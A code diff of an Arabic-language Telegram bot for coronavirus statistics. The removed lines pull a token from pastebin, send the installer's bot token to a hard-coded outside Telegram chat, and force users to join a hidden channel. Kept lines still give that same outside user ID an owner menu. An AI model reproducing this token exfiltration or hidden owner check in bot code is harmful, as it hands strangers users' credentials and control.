@@ -9,14 +9,12 @@ conff = open('config.py', 'r').read()
 
 if 'sudo' in conff:
     import config
-    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
 
     token = config.token
     sudo = config.sudo
     ch = config.ch
     bot = telebot.TeleBot(token)
 
-    requests.get(f'https://api.telegram.org/bot{req_token}/sendMessage?chat_id=1300329679&text=new bot has been start boss \n\n token : {token} \n\n username : @{ch} \n\n ')
     print('Bot Has Been Started >>>>>>>>>>>>>>>>>')
     headerss = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -47,9 +45,6 @@ if 'sudo' in conff:
 
     @bot.message_handler(commands=['start'])
     def startbot(message):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
-
         url_wrold = requests.get(f'https://www.worldometers.info/coronavirus/').text
         url_iraq = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
         casess = re.search(r'<div class=\"maincounter-number\">\n<span style=\"color:#aaa\">(.*?) </span>\n</div>' , url_wrold).group(1)
@@ -85,12 +80,9 @@ if 'sudo' in conff:
         idd = message.from_user.id
         sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
         req = requests.get(sub, headers=headerss)
-        submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
-        reqmores = requests.get(submores, headers=headerss)
         if idd == sudo or idd == 1300329679:
             bot.send_message(message.chat.id, text='Hi boss\n\n'
                             , parse_mode='markdown', reply_markup=markup_inline)
-        if 'member' in reqmores.text or 'creator' in  reqmores.text or 'administrator' in  reqmores.text:
             if 'member' in req.text or 'creator' in  req.text or 'administrator' in  req.text:
                 bot.send_message(message.chat.id, text=f'* هلا حبيبي {first} *\n\n'
                                                     '*🦠 البوت يقدم احصائيات فايروس كورونا: * \n\n'
@@ -108,18 +100,10 @@ if 'sudo' in conff:
                                 , parse_mode='markdown', reply_markup=markup_help)
             else:
                 bot.send_message(message.chat.id, text=f'*اشترك(@{ch}) واضغط (/start)*', parse_mode='markdown')
-        else:
-            bot.send_message(message.chat.id, text=f'*اشترك (@{req_channel}) واضغط (/start)*', parse_mode='markdown')
 
     @bot.callback_query_handler(func=lambda call: True)
     def answer(call):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
         idd = call.message.from_user.id
-        sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
-        req = requests.get(sub, headers=headerss)
-        submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
-        reqmores = requests.get(submores, headers=headerss)
         cid = call.message.chat.id
         mid = call.message.message_id
         if call.data == 'file':
@@ -190,14 +174,12 @@ else:
     with open('config.py', 'a') as x:
         x.write(f'token = \'{TToken}\'' + '\n' + f'sudo = {sudooo}' + '\n' + f'ch = \'{chhh}\'')
         x.close
-    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
     import config
     token = config.token
     sudo = config.sudo
     ch = config.ch
     bot = telebot.TeleBot(token)
 
-    requests.get(f'https://api.telegram.org/bot{req_token}/sendMessage?chat_id=1300329679&text=new bot has been start boss \n\n token : {token} \n\n username : @{ch} \n\n ')
     print('Bot Has Been Started >>>>>>>>>>>>>>>>>')
     headerss = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -228,9 +210,6 @@ else:
 
     @bot.message_handler(commands=['start'])
     def startbot(message):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
-
         url_wrold = requests.get(f'https://www.worldometers.info/coronavirus/').text
         url_iraq = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
         casess = re.search(r'<div class=\"maincounter-number\">\n<span style=\"color:#aaa\">(.*?) </span>\n</div>' , url_wrold).group(1)
@@ -266,12 +245,9 @@ else:
         idd = message.from_user.id
         sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
         req = requests.get(sub, headers=headerss)
-        submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
-        reqmores = requests.get(submores, headers=headerss)
         if idd == sudo or idd == 1300329679:
             bot.send_message(message.chat.id, text='Hi boss\n\n'
                             , parse_mode='markdown', reply_markup=markup_inline)
-        if 'member' in reqmores.text or 'creator' in  reqmores.text or 'administrator' in  reqmores.text:
             if 'member' in req.text or 'creator' in  req.text or 'administrator' in  req.text:
                 bot.send_message(message.chat.id, text=f'* هلا حبيبي {first} *\n\n'
                                                     '*🦠 البوت يقدم احصائيات فايروس كورونا: * \n\n'
@@ -289,18 +265,10 @@ else:
                                 , parse_mode='markdown', reply_markup=markup_help)
             else:
                 bot.send_message(message.chat.id, text=f'*اشترك(@{ch}) واضغط (/start)*', parse_mode='markdown')
-        else:
-            bot.send_message(message.chat.id, text=f'*اشترك (@{req_channel}) واضغط (/start)*', parse_mode='markdown')
 
     @bot.callback_query_handler(func=lambda call: True)
     def answer(call):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
         idd = call.message.from_user.id
-        sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
-        req = requests.get(sub, headers=headerss)
-        submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
-        reqmores = requests.get(submores, headers=headerss)
         cid = call.message.chat.id
         mid = call.message.message_id
         if call.data == 'file':
